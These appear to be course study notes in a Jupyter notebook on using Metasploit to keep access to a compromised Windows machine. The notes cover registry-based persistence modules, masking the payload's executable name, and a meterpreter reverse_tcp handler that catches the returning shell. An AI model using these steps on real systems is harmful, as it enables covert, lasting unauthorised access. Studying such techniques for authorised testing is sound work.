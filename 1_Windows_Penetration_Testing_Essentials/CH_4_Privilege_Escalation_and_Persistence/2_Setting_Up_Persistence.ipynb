{
 "cells": [
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# **Setting up persistence**"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Setting up persistence allows continious access to target without re-applying or exploiting the system again. A hassle if an exploit gets patched."
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- Using a post exploit module to maintain persistence.\n",
    "    - In msfconsole\n",
    "        - search persistence\n",
    "            - exploit/windows/local/vss_persistence \n",
    "            - OR, exploit/windows/local/persistence_service\n",
    "            - OR, exploit/windows/local/persistence (recommended)\n",
    "                - sets up payload in registry so payload runs every boot.\n",
    "                - just needs handler to listen to payload."
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**exploit/windows/local/persistence**\n",
    "\n",
    "- use exploit/windows/local/persistence\n",
    "- show options\n",
    "    - DELAY, retry payload every # seconds\n",
    "    - EXE_NAME, mask payload behind a name\n",
    "    - SESSION, session of the payload currently active on target\n",
    "- show advanced\n",
    "- set payload\n",
    "    - sets the payload for the persistence module\n",
    "- run"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- Use handler to listen to session.\n",
    "    - use exploit/multihandler\n",
    "    - set payload to listen to\n",
    "        - EX: set payload windows/meterpreter/reverse_tcp\n",
    "    - show options\n",
    "        - set LHOST\n",
    "        - set LPORT to persistence module\n",
    "    - run"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
